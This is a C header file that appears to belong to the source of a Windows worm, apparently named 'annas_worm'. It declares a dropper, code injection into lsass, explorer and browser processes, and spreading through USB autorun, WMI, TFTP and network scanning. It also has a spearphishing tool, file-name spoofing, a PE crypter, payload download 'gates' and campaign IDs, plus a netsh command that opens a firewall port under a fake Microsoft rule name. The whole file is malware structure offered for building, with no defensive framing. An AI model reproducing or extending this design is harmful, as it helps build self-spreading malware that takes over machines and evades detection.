#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <WinInet.h>
#include <tlhelp32.h>
#include <WinBase.h>
#include <Psapi.h>
#include <time.h>
#include <Ws2tcpip.h>
//#include <Ntsecpkg.h>
#include <WinNetWk.h>
#include <bcrypt.h>
#include <ntstatus.h>
#include <WbemIdl.h>
#include <wincred.h>
#include <ObjBase.h>
//#include <comdef.h>
#include <WbemIdl.h>
#include <WTypes.h>
#include <locale.h>
#include <mbstring.h>
//#include <afxtempl.h>
//#include <afxsock.h>
#include <IPHlpApi.h>
#include <IcmpAPI.h>
#include <LM.h>
#include <WinCrypt.h>
#include <netfw.h>
#include <crtdbg.h>
#include <OleAuto.h>
#include <Shlwapi.h>
#include <Imagehlp.h>

#include "config.h"

// Library import
/*
ws2_32.lib
Psapi.lib
wininet.lib
Bcrypt.lib
mpr.lib
urlmon.lib
wbemuuid.lib
CREDUI.LIB
Iphlpapi.lib
netapi32.lib
ole32.lib
oleaut32.lib
Shlwapi.lib
Imagehlp.lib
*/

// Data types
#define ERROR_CODE						INT
#define PADDRINFO						ADDRINFO*
#define HOSTENT							struct hostent
#define PHOSTENT						HOSTENT*
#define SOCKADDR						struct sockaddr
#define PSOCKADDR						SOCKADDR*

typedef unsigned __int64				QWORD;
typedef unsigned __int8					FIXED_RANGE;
typedef QWORD *							PQWORD;

// File configurations
#define DLL_LOADER_TARGET				"..\\Debug\\core32.dll"
#define DLL_LOADER_TARGET64				"..\\x64\\Debug\\core64.dll"

// Entry point definitions
#define DLL_MAIN_ENTRY_POINT			"LoadDll"
#define DROPPER_ENTRY_POINT				"DrpOEP"
#define DLL_MAIN_ENTRY_POINT64			"LoadDll64"
#define DROPPER_ENTRY_POINT64			"DrpOEP64"

// Debug constants
#define DEBUG_EVENT_NAME				"Global\\DebugTrigger1"
#define DEBUG_MAP_NAME					"Global\\DebugMap"
#define DEBUG_EVENT_LOCK				"Global\\EventLock"
#define DEBUG_BUFFER_SIZE				1024
#define LOG_FILE						"J:\\n0day2\\log.txt"

// Various constants
#define KERNEL32_NAME					"kernel32.dll"
#define CHARACTER_MAP					"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
#define PIF_EXTENSION					".pif"

// General constants
#define MAX_THREADS						1024
#define DEFAULT_TFTPD_PORT				69
#define PANIC_EIP						0xfafafafa

// Event object constants
#define LSASS_TO_HUSK_PAYLOAD_MUTEX		"Global\\8SD8FSA4JHGAS38F8JASDF"
#define LSASS_TO_HUSK_PAYLOAD_MAPPING	"Global\\34J8DJA87HASD8JF82J34F"
#define TFTPD_READY_MUTEX				"Global\\23KD98G8A8JSD8HG2489HG"
#define SYNC_USB_BETWEEN_PROC			"Global\\8DFJS89DJFS89DJF9S8JDF"

// Registry keys
#define PAYLOAD_SIZE_HIVE				HKEY_LOCAL_MACHINE
#define PAYLOAD_SIZE_SUBKEY				"system\\logging3"
#define PAYLOAD_SIZE_NAME				"misinformation"

// Payload downloader constants
#define MAX_LIST_LENGTH					1024
#define	MAX_HOSTNAME_IP_SIZE			4096

// Infector shellcode offsets
#define SC_INFECTOR_EIP					0x3

// USB Wrapper tool constants
#define KPCOE_FILE_NAME					"KPCOE.exe"
#define KPCOE_CONFIG_FILE				"KPCOE.tool.cfg"
#define WRAPPER_DL_THREAD_STATE			0x12345678
#define WRAPPER_DL_THREAD_BUF_RDY		"9JF09JG0D9JF09JGA"
#define WRAPPER_WAIT_FOR_TEMPLATE		5000
#define MAX_TMP_FILE_LENGTH				24
#define WRAPPER_PAYLOAD_SIG				0xfbfffbff

// Builder specified file names
#define DEBUG_FILE_NAME
#ifndef	DEBUG_FILE_NAME
#define B_OUT_FILE						"J:\\annas_worm..\\Build\\output.exe"
#define B_CORE32						"J:\\annas_worm\\Build\\CORE32.dll"
#define B_CORE64						"J:\\annas_worm\\Build\\CORE64.dll"
#define B_DROPPER						"J:\\annas_worm\\Build\\dropper.exe"
#else
// VS DEBUGGING ONLY
#define B_OUT_FILE						"J:\\annas_worm\\output.exe"
#define B_CORE32						"J:\\annas_worm\\Build\\CORE32.dll"
#define B_CORE64						"J:\\annas_worm\\Build\\CORE64.dll"
#define B_DROPPER						"J:\\annas_worm\\BUILD\\dropper.exe"
#endif

// Strings for the port opener
#define PORT_OPEN_WIN7					"netsh advfirewall firewall add rule name=\"Microsoft DCOM-inbound\" dir=in action=allow protocol=UDP localport=69"

// USB Infector constants
#define SC0_SIGNATURE					(WORD)0xfafb

// Builder Constants & definitions
#define	USAGE_MESSAGE					"For usage check the technical document.\n"

// Wrapper Constants & definitions
#define USAGE_MESSAGE_WRAPPER_SA		USAGE_MESSAGE

// Local DLL Worming config
#define MAX_PIDS						1024

// Function constants
#ifdef REROUTE_TO_DBGPRINT
#define DEBUG							debug_print
#define DEBUGW							send_debug_channelw
#else
#define DEBUG							send_debug_channel
#define DEBUGW							send_debug_channelw
#endif
#define PANIC							panic()
#define round(n, r)						(((n+(r-1))/r)*r)
#define CALCULATE_ADDRESS(base, offset) (((DWORD)(base)) + (offset))
#define MakePtr( cast, ptr, addValue )	(cast)( (DWORD_PTR)(ptr) + (DWORD_PTR)(addValue))
#define CRASH							*(PDWORD)0 = 1;

// Assembly
#ifndef _WIN32
#define __nop							__asm{nop}
#else
#define __nop							__nop()
#endif
#ifndef	_WIN32
#define BREAK							__asm{int 3};
#else
#define BREAK							__debugbreak()
#endif

// Cryptographic constants
#define SIZEOF_SHA_SUM					20

// Dropper definitions & constants
#define DLL32							0x00000032
#define DLL64							0x00000064

// PE Constants
#define IMAGE_SIZEOF_BASE_RELOCATION	sizeof(IMAGE_BASE_RELOCATION)

// Threading
#define MAX_LOCAL_THREADS				1024

// Net scanner constants
#define IP_ADDRESS_LIST_POOL			0x1000
#define SCAN_NET_UPDATE_INTERVAL		10

// Target process constants
#define EXPLORER_STRING					"explorer.exe"
#define IEXPLORER_STRING				"iexplore.exe"
#define NOTEPAD_STRING					"notepad.exe"
#define LSASS_STRING					"lsass.exe"
#define MSN_STRING						"msnmsgr.exe"
#define PIDGIN_STRING					"pidgin.exe"
#define FIREFOX_STRING					"firefox.exe"
#define OPERA_STRING					"opera.exe"
#define CMD_STRING						"cmd.exe"
#define SERVICE_STRING					"services.exe"
#define SVCHOST_STRING					"svchost.exe"

// Builder configuration and offsetting
#define	XOR_KEY							0
#define ATTACK_ID						0x4
#define	CAMPAIGN_ID						0x8
#define URL_LIST						0xc

// Error codes 
#define	NTSTATUS_ERROR					FALSE;
#define HUSK_ERROR_TRUE					TRUE
#define HUSK_ERROR_FALSE				FALSE

// Structures
typedef struct groupicon {
	WORD Reserved1;       // reserved, must be 0
	WORD ResourceType;    // type is 1 for icons
	WORD ImageCount;      // number of icons in structure (1)
	BYTE Width;           // icon width (32)
	BYTE Height;          // icon height (32)
	BYTE Colors;          // colors (0 means more than 8 bits per pixel)
	BYTE Reserved2;       // reserved, must be 0
	WORD Planes;          // color planes
	WORD BitsPerPixel;    // bit depth
	DWORD ImageSize;      // size of structure
	WORD ResourceID;      // resource ID
} GROUPICON, *PGROUPICON;

typedef struct wrapper_payload_data {
	DWORD		key;
	DWORD		signature;
	UINT		original_file_length;
	UINT		payload_length;
} WRAPPER_PAYLOAD_DATA, *PWRAPPER_PAYLOAD_DATA;

typedef struct http_file {
	char				*inet_agent;
	DWORD				*out_buffer;
	unsigned int		buffer_size;
	unsigned int		buffer_virtual_size;
	char				*file;
	char				*server_host;
	char				*server_ip;
	INTERNET_PORT		server_port;
	char				*login_user;
	char				*login_pass;
	int					return_error;
} HTTP_FILE, *PHTTP_FILE;

typedef struct NtCreateThreadExBuffer
 {
	SIZE_T	Size;
	SIZE_T	Unknown1;
	SIZE_T	Unknown2;
	PSIZE_T	Unknown3;
	SIZE_T	Unknown4;
	SIZE_T	Unknown5;
	SIZE_T	Unknown6;
	PSIZE_T	Unknown7;
	SIZE_T	Unknown8;
 } NTCREATETHREADEXBUFFER, *PNTCREATETHREADEXBUFFER;

typedef struct core64_shell_parms {
	LPVOID				core64_raw;
	DWORD				core64_oep;
	HANDLE				target_process;
	UINT				core64_raw_size;
//	DWORD				heaven_return_abs;		// OBSOLETE
} CORE64_SHELL_PARMS, *PCORE64_SHELL_PARMS;

typedef struct wrapper_infect_log {
	LPCSTR					file_name;
	LPVOID					next;
} WRAPPER_INFECT_LOG, *PWRAPPER_INFECT_LOG;

typedef struct user_configuration {
	DWORD			key;
	UINT			attack_id;
	UINT			campaign_id;
	DWORD			offset_to_gates;
	UINT			size_of_gates;
	DWORD			offset_to_webdavs;
	UINT			size_of_webdavs;
	BOOL			ntm;
	BOOL			usb;
	BOOL			autorun;
	BOOL			date;
	BOOL			rto;
	BOOL			wrapper;
	BOOL			pe;
	FIXED_RANGE		pe_probability;
	FIXED_RANGE		wrapper_probability;
	FIXED_RANGE		pif_probability;
	UINT			ignored_days;
} USER_CONFIGURATION, *PUSER_CONFIGURATION;

typedef struct wrapper_file_info {
	LPCSTR			file_name;
	UCHAR			extension[16];
	BOOL			datetime;
	BOOL			rto;
} WRAPPER_FILE_INFO, *PWRAPPER_FILE_INFO;

typedef struct global_configuration {
	UINT			attack_id;
	UINT			campaign_id;
	LPCSTR			gate_list_string;	// NOTE: THIS IS THE RAW CONCATENATED STRING
	LPCSTR			webdav_list_string;
	LPCSTR			extension;			// NOTE: only for the spearphisher tool
	UINT			gate_list_size;
	UINT			webdav_list_size;
	PDWORD			skeleton;			// NOTE: spearphisher
	UINT			skeleton_size;
	DWORD			key;
	BOOL			spearphisher;		// is the spearphisher on?
	BOOL			ntm;
	BOOL			usb;
	BOOL			autorun;
	BOOL			date;
	BOOL			rto;
	BOOL			wrapper;
	BOOL			pe;
	FIXED_RANGE		pe_probability;
	FIXED_RANGE		wrapper_probability;
	FIXED_RANGE		pif_probability;
	UINT			ignored_days;
} GLOBAL_CONFIGURATION, *PGLOBAL_CONFIGURATION;

typedef struct icon_image {
	UINT			width, height, colors;
	LPBYTE			bits;
	DWORD			number_of_bytes;
	LPBITMAPINFO	bitmap;
	LPBYTE			xor;
	LPBYTE			and;
} ICONIMAGE, *PICONIMAGE;

typedef struct icon_dir_entry {
	BYTE			width;
	BYTE			height;
	BYTE			color_count;
	BYTE			reserved;
	WORD			planes;
	WORD			bit_count;
	DWORD			bytes_in_res;
	DWORD			image_offset;
} ICONDIRENTRY, *PICONDIRENTRY;

typedef struct res_ico_entry {
	BYTE			width;
	BYTE			height;
	BYTE			color_count;
	BYTE			reserved;
	WORD			planes;
	WORD			bit_count;
	DWORD			bytes_in_res;
	WORD			image_offset;
} RESICONENTRY, *PRESICONENTRY;

#define MAX_ICONS 32

typedef struct icon_dir {
	WORD			reserved;
	WORD			type;
	WORD			count;
	PICONDIRENTRY	icon_dir_entries[MAX_ICONS];
} ICONDIR, *PICONDIR;

//typedef BOOL SEARCH_DIRECTION;
#define SEARCH_CHAR_FORWARD			1
#define SEARCH_CHAR_BACKWARD		0

// Other headers
#include "shared.h"
#include "globals.h"
#include "net.h"
#include "xTG.h"
#include "lsass.h"
#ifndef OWN_RESOURCES
#include "resource.h"
#endif
#include "wrapper.h"
#include "..\CORE64\import64_shellcode.h"

// Prototypes
//typedef int mz_bool;
//mz_bool mz_zip_add_mem_to_archive_file_in_place(const char *pZip_filename, const char *pArchive_name, const void *pBuf, size_t buf_size, const void *pComment, mz_uint16 comment_size, mz_uint level_and_flags);

// main32.c
						BOOL APIENTRY		DllMain(						HANDLE							module,
																			DWORD							reserved_call,
																			LPVOID							reserved);

__declspec(dllexport)	VOID _cdecl			LoadDll(						LPVOID							dll_raw);
__declspec(dllexport)	VOID _cdecl			DrpOEP(							LPVOID							dll_raw);
						VOID				LoadDllDebug					(VOID);

// main64.c
__declspec(dllexport)	VOID __cdecl		LoadDll64(						LPVOID							dll_raw);
__declspec(dllexport)	VOID __cdecl		DrpOEP64(						LPVOID							dll_raw);
						VOID				DebugEntry64					(VOID);

// debug.c
						VOID				initialize_debug_channel		(VOID);
						VOID				send_debug_channel(				char *FormatString, ...);
						VOID				debug_catcher					(VOID);
						VOID				debug_print(					PCHAR							FormatString, ...);
						VOID				send_debug_channelw(			wchar_t *FormatString, ...);
						VOID				debug_logger(					PCHAR FormatString, ...); 
// privilege.c
						BOOL				enable_debug_priv				(VOID);

// imports32.c
						VOID				resolve_local_api32				(VOID);
						LPVOID				resolve_export(HMODULE	module, LPCSTR function);

// imports64.c			
						VOID				resolve_local_api64				(VOID);
						LPVOID				resolve_export64(				PDWORD							module, 
																			LPCSTR							function);
						QWORD				get_kernel32_base64				(VOID);
						PDWORD				grab_shellcode(					DWORD							resource_identifier, 
																			LPCWSTR							resource_name);
						QWORD				get_local_dll_base64			(VOID);
// asm32.c
						HMODULE				get_kernel32_base32				(VOID);
						HMODULE				get_local_dll_base				(VOID);

// threads.c
						LPSTR				generate_text_checksum			(VOID);
						VOID				fetch_payload					(VOID);
						VOID				thread_dispatcher				(VOID);
						VOID				dispatch_thread(				LPTHREAD_START_ROUTINE			function, 
																			LPVOID							parameters);
						VOID				replicate_dll_thread			(VOID);
						BOOL				thread_control(					BOOL							suspend, 
																			INT								threads[MAX_THREADS], 
																			PINT							thread_count);
						DWORD				get_random_address_from_pool(	PDWORD							list);
						VOID				panic							(VOID);
						VOID				extract_user_config				(VOID);

// firewall.cpp
						BOOL				drop_firewall_win7				(VOID);

// scan.c
						VOID				scan_net						(VOID);
						BOOL				test_syn_port(					DWORD							port_number, 
											DWORD							target);
						DWORD				get_local_ip_address			(VOID);
						VOID				irp_cache_renew					(VOID);
						BOOL				drop_local_firewall				(VOID);


// worm.c
						VOID				propagate_dll_thread(			LPCSTR							target_process_name);
						DWORD				get_random_pid(					DWORD							pid_array[MAX_PIDS]);
						DWORD				propagate_dll(					DWORD							pid,
																			LPCSTR							process_name,
																			LPCSTR							oep);

// pid.c
						BOOL				find_pid(						LPCSTR							process_name, 
																			DWORD							pid_array[MAX_PIDS]);
// relocate.c
						VOID				fix_image_base_relocs(			PBYTE							image_base,
																			PDWORD							remote_image,
																			PBYTE							remote_image_base);

// wrappers.c
						INT WSAAPI			winet_pton(						__in INT						Family,
																			__in LPCSTR						pszAddrString,
																			__out PDWORD					pAddrBuf);

// Dropper
						BOOL				get_pointer_to_payload(			PDWORD							*payload, 
																			DWORD							type);
						VOID				append_segment(					__in	PDWORD					payload,
																			__in	UINT					payload_size,
																			__inout	PDWORD					*main_image,
																			__inout	PUINT					main_image_size);
						BOOL				initialize_CORE64(				PDWORD							core64,
																			PDWORD							shellcode,
																			UINT							core64_raw_size);
						HANDLE				open_random_target				(VOID);
						DWORD				get_core64_entry(				PDWORD							raw_base, 
																			LPCSTR							export_name);

// lsass5.c
						VOID				lsass_procedure5				(VOID);

// usb.c
						BOOL				find_all_usb_drive_letters(		__out PCHAR						drive_letter_out);
						VOID				thread_webdav_enum				(VOID);
						VOID				install_autorun(				LPCSTR							drive_letter);
						VOID				enum_usb_files(					LPCSTR							directory);
						BOOL				usb_file_packer(				LPCSTR							file_name, 
																			BOOL							delete_file, 
																			BOOL							rto, 
																			BOOL							datetime,
																			BOOL							call_crypter,
																			BOOL							compresion,
																			LPCSTR							compression_archive,
																			LPCSTR							extension,
																			LPCSTR							kpcoe_config_file,
																			HMODULE							dll_base);
						VOID				usb_file_injector(				LPCSTR							file_name);
						BOOL				rtl_character_rename(			__in		LPCSTR				file_name, 
																			__in		LPCSTR				extension,
																			__out		LPWSTR				unicode_output);
						BOOL				install_pe_crypter(				LPCSTR							file_name);
						BOOL				append_date_filename(			__in		LPCSTR				file_name, 
																			__out		PCHAR				out_file);
						BOOL				mutate_wrapper(					PDWORD							*buffer, 
																			PUINT							buffer_size,
																			UINT							shellcode_instruction_length);
						BOOL				install_pe_resource(			__inout		PDWORD				*base,					// Input: base, Output: Reallocated new Base
																			__inout		PUINT				base_size,				// Input: base size, Output: New Base Size
																			__in		DWORD				identifier,
																			__in		LPCSTR				identifier_name,
																			__in		HMODULE				dll_base);

// wmi.c
						BOOL				propagate_through_wmi(			PCHAR							target);		
						PCHAR				get_local_dc					(VOID);

// tftp.c
						BOOL				tftpd_intro						(VOID);
						VOID					tftp_exit(					ERROR_CODE						status);

						// exception.c
static					LONG CALLBACK		top_level_exception_handler(	PEXCEPTION_POINTERS				exception_pointer);

// API
typedef					NTSTATUS			(WINAPI *LNtCreateThreadEx)(	OUT	PHANDLE						hThread,
																			IN	ACCESS_MASK					DesiredAccess,
																			IN	LPVOID						ObjectAttributes,
																			IN	HANDLE						ProcessHandle,
																			IN	LPTHREAD_START_ROUTINE		lpStartAddress,
																			IN	LPVOID						lpParameter,
																			IN	BOOL						CreateSuspended, 
																			IN	ULONG						StackZeroBits,
																			IN	ULONG						SizeOfStackCommit,
																			IN	ULONG						SizeOfStackReserve,
																			OUT	LPVOID						lpBytesBuffer);

typedef					NTSTATUS			(WINAPI *LZwWriteVirtualMemory)(IN HANDLE						ProcessHandle,
																			IN PVOID						BaseAddress,
																			IN PVOID						Buffer,
																			IN ULONG						BufferLength,
																			OUT PULONG						ReturnLength		OPTIONAL);


